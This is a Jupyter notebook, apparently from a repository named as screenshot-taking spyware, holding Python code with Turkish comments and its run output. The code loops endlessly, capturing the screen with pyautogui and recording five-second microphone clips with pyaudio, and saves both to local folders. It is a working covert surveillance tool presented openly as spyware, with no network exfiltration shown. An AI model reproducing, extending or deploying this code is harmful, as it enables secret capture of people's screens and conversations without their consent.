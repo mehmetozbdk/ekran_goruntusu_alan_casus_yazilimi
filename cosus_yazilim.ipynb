{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c7945d6e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n",
      "Finished recording.\n",
      "Ekran görüntüsü başarıyla kayıt edildi...\n",
      "Recording...\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[1;32mIn [1], line 59\u001b[0m\n\u001b[0;32m     56\u001b[0m catchScreenshot()\n\u001b[0;32m     58\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m isPlay \u001b[38;5;241m==\u001b[39m \u001b[38;5;28;01mFalse\u001b[39;00m:\n\u001b[1;32m---> 59\u001b[0m     \u001b[43mcatchTheMicrophone\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m     61\u001b[0m count1 \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;241m1\u001b[39m\n\u001b[0;32m     62\u001b[0m count2 \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;241m1\u001b[39m\n",
      "Cell \u001b[1;32mIn [1], line 35\u001b[0m, in \u001b[0;36mcatchTheMicrophone\u001b[1;34m()\u001b[0m\n\u001b[0;32m     33\u001b[0m frames \u001b[38;5;241m=\u001b[39m []\n\u001b[0;32m     34\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(\u001b[38;5;241m0\u001b[39m, \u001b[38;5;28mint\u001b[39m(RATE \u001b[38;5;241m/\u001b[39m CHUNK \u001b[38;5;241m*\u001b[39m RECORD_SECONDS)): \u001b[38;5;66;03m# 44100 / (5120 = CHUNK * RECORD_SECONDS) \u001b[39;00m\n\u001b[1;32m---> 35\u001b[0m     data \u001b[38;5;241m=\u001b[39m \u001b[43mstream\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\u001b[43mCHUNK\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m     36\u001b[0m     frames\u001b[38;5;241m.\u001b[39mappend(data)\n\u001b[0;32m     38\u001b[0m stream\u001b[38;5;241m.\u001b[39mstop_stream()\n",
      "File \u001b[1;32m~\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\pyaudio\\__init__.py:570\u001b[0m, in \u001b[0;36mPyAudio.Stream.read\u001b[1;34m(self, num_frames, exception_on_overflow)\u001b[0m\n\u001b[0;32m    567\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_is_input:\n\u001b[0;32m    568\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mIOError\u001b[39;00m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mNot input stream\u001b[39m\u001b[38;5;124m\"\u001b[39m,\n\u001b[0;32m    569\u001b[0m                   paCanNotReadFromAnOutputOnlyStream)\n\u001b[1;32m--> 570\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mpa\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread_stream\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_stream\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mnum_frames\u001b[49m\u001b[43m,\u001b[49m\n\u001b[0;32m    571\u001b[0m \u001b[43m                      \u001b[49m\u001b[43mexception_on_overflow\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "import pyautogui\n",
    "import time\n",
    "import pyaudio\n",
    "import wave\n",
    "\n",
    "everySeconds = 2\n",
    "count1 = 1\n",
    "count2 = 1\n",
    "isPlay = False\n",
    "\n",
    "CHUNK = 1024 #arabellekteki kare sayısıdır.\n",
    "FORMAT = pyaudio.paInt16\n",
    "CHANNELS = 2\n",
    "RATE = 44100 #saniyede toplanan örnek sayısıdır.\n",
    "RECORD_SECONDS = 5\n",
    "\n",
    "def catchScreenshot():\n",
    "    screenshot = pyautogui.screenshot()\n",
    "    screenshot.save(f'ekranGoruntuleri/screenshot{count1}.png')\n",
    "    print(\"Ekran görüntüsü başarıyla kayıt edildi...\")\n",
    "\n",
    "def catchTheMicrophone():\n",
    "    isPlay = True\n",
    "    p = pyaudio.PyAudio()\n",
    "\n",
    "    stream = p.open(format=FORMAT,\n",
    "                    channels=CHANNELS,\n",
    "                    rate=RATE,\n",
    "                    input=True,\n",
    "                    frames_per_buffer=CHUNK)\n",
    "\n",
    "    print(\"Recording...\")\n",
    "    frames = []\n",
    "    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)): # 44100 / (5120 = CHUNK * RECORD_SECONDS) \n",
    "        data = stream.read(CHUNK)\n",
    "        frames.append(data)\n",
    "\n",
    "    stream.stop_stream()\n",
    "    stream.close()\n",
    "\n",
    "    p.terminate() #sonlandırmak\n",
    "\n",
    "    WAVE_OUTPUT_FILENAME = f\"kayitlar//record{count2}.wav\"\n",
    "\n",
    "    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')\n",
    "    wf.setnchannels(CHANNELS)\n",
    "    wf.setsampwidth(p.get_sample_size(FORMAT))\n",
    "    wf.setframerate(RATE)\n",
    "    wf.writeframes(b''.join(frames)) # her sesi saniye saniye uç uca ekler\n",
    "    wf.close()\n",
    "\n",
    "    print(\"Finished recording.\")\n",
    "    isPlay = False\n",
    "\n",
    "while(True):\n",
    "    catchScreenshot()\n",
    "    \n",
    "    if isPlay == False:\n",
    "        catchTheMicrophone()\n",
    "\n",
    "    count1 += 1\n",
    "    count2 += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "35dd4116",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
